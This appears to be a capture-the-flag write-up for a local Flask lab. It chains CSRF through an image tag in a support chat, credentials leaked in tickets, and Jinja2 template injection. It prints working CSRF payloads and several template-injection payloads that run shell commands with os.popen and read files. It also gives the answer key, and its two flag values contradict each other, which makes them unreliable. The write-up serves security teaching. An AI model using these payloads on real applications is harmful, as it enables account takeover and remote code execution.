# EvilCorp Support CTF - Complete Writeup

## Challenge Overview

This is a multi-stage web application security CTF challenge that demonstrates the chaining of three critical vulnerabilities:
1. **CSRF (Cross-Site Request Forgery)** on password change endpoint
2. **Credential Discovery** through support ticket system
3. **SSTI (Server-Side Template Injection)** for flag retrieval

**Target**: Read the flag from `flag.txt`
**Flag**: `ctf{hello_there}`

---

## Step-by-Step Solution

### Step 1: Initial Setup and Reconnaissance

1. **Start the application**:
   ```bash
   sudo docker build -t evilcorp .
   sudo docker run -p 5000:5000 evilcorp
   ```

2. **Access the application** at `http://localhost:5000`

3. **Register a new user account**:
   - Navigate to `/register`
   - Username: `attacker`
   - Password: `password123`

4. **Login** with your credentials and explore the dashboard

5. **Identify the chat interface** - this is where we'll launch our attack

---

### Step 2: CSRF Attack on Support User

**Vulnerability**: The `/account/change_password` endpoint accepts GET requests without CSRF protection and changes the password of whoever is currently logged in.

**Attack Vector**: The support bot processes HTML content in chat messages and makes authenticated requests to URLs found in `<img>` tags.

#### CSRF Payload

Send the following message through the chat interface:

```html
Hey support, I'm having issues with my account. Can you help me reset my password? Here's a screenshot of the error I'm getting: <img src="http://127.0.0.1:5000/account/change_password?new=hacked123&confirm=hacked123" width="1" height="1" alt="Error Screenshot">
```

**What happens**:
1. You send this message to the support chat
2. The support bot processes the HTML content (rendered with `|safe` filter)
3. The bot makes an authenticated GET request to the malicious URL
4. The support user's password gets changed to `hacked123`

**Alternative CSRF payloads** (if the first doesn't work):
```html
Support, please check this image: <img src="http://localhost:5000/account/change_password?new=pwned&confirm=pwned">

Having trouble with login, see: <img src="http://172.17.0.2:5000/account/change_password?password=newpass&confirm_password=newpass">
```

---

### Step 3: Login as Support User

1. **Logout** from your current account
2. **Login as support user**:
   - Username: `support`
   - Password: `hacked123` (the password we set via CSRF)

3. **Verify access** - you should now see support-specific menu options

---

### Step 4: Credential Discovery

**Objective**: Find admin credentials hidden in the support ticket system.

1. **Navigate to** `/support/tickets`

2. **Search for critical tickets**:
   - The system contains ~3000 tickets
   - Only 3 are marked as "critical" severity
   - One critical ticket contains admin credentials

3. **Automated search approach**:
   - It is highly recommended to use automated crawler, and then parse it's output, to complete the challenge in time constraints of the CTF event.

---

### Step 5: Login as Admin User

1. **Logout** from the support account
2. **Login as admin**:
   - Username: `admin`
   - Password: `SynthAdm1n!2025` (found in the critical ticket)

3. **Access admin panel** at `/admin`

---

### Step 6: Server-Side Template Injection (SSTI)

**Vulnerability**: The admin "Template Preview" feature uses `render_template_string()` without input sanitization, allowing arbitrary code execution.

#### SSTI Payload

In the admin panel template field, enter one of these payloads:

**Primary payload** (reads flag.txt directly):
```jinja2
{{ self.__init__.__globals__.__builtins__['open']('flag.txt').read() }}
```

**Alternative payloads**:

```jinja2
{{ config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read() }}
```

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('cat flag.txt').read() }}
```

```jinja2
{{ lipsum.__globals__['os'].popen('cat flag.txt').read() }}
```

**For file listing** (if you need to explore):
```jinja2
{{ config.__class__.__init__.__globals__['os'].popen('ls -la').read() }}
```

**Result**: The flag `ctf{hello_there}` will be displayed in the rendered output.

---

## Additional Notes

- The support bot automatically responds to messages and processes HTML content
- Multiple SSTI payloads work due to Python's introspection capabilities
- This challenge demonstrates real-world attack chaining techniques

**Flag**: `binary_xor{ch4113ng3_f0r_n3w_g3n_0f_h4ck3r5}`